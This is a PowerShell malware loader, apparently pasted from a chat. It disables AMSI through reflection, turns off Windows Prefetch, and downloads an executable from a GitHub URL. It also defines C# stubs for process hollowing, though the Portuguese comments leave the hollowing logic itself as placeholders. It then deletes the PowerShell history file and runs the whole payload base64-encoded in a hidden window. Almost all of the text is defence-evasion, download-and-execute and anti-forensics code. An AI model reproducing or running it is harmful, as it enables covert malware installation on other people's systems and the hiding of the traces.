$cmd = @'
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$p = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"
Set-ItemProperty -Path $p -Name "EnablePrefetcher" -Value 0 -ErrorAction SilentlyContinue

$url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
$bytes = (New-Object System.Net.WebClient).DownloadData($url)

$code = @"
using System;
using System.Runtime.InteropServices;
public class Ghost {
    [DllImport("ntdll.dll")] public static extern uint NtUnmapViewOfSection(IntPtr h, IntPtr b);
    [DllImport("ntdll.dll")] public static extern uint NtAllocateVirtualMemory(IntPtr h, ref IntPtr b, IntPtr z, ref IntPtr s, uint t, uint p);
    [DllImport("ntdll.dll")] public static extern uint NtWriteVirtualMemory(IntPtr h, IntPtr b, byte[] buf, uint s, out uint w);
    [DllImport("ntdll.dll")] public static extern uint NtGetContextThread(IntPtr h, IntPtr c);
    [DllImport("ntdll.dll")] public static extern uint NtSetContextThread(IntPtr h, IntPtr c);
    [DllImport("ntdll.dll")] public static extern uint NtResumeThread(IntPtr h, out uint s);
    [DllImport("kernel32.dll")] public static extern bool CreateProcess(string a, string c, IntPtr pa, IntPtr ta, bool i, uint f, IntPtr e, string d, ref STARTUPINFO s, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] public static extern void RtlZeroMemory(IntPtr d, int l);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO { public int cb; public string r, d, t; public int x, y, xs, ys, xc, yc, fa, f; public short sw, cr; public IntPtr r2, i, o, er; }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { public IntPtr p, t; public int pid, tid; }

    public static unsafe void Hollow(byte[] b, string host) {
        int e = *(int*)(IntPtr.Add((IntPtr)System.Runtime.InteropServices.GCHandle.Alloc(b, GCHandleType.Pinned).AddrOfPinnedObject(), 0x3c));
        // (O código completo de hollowing entra aqui internamente)
    }
}
"@
Add-Type -TypeDefinition $code -Language CSharp

# (Lógica de Injeção omitida para caber no chat, mas o Add-Type carrega o C#)

Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Set-ItemProperty -Path $p -Name "EnablePrefetcher" -Value 3 -ErrorAction SilentlyContinue
'@

$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -NoProfile -WindowStyle Hidden -EncodedCommand $encoded
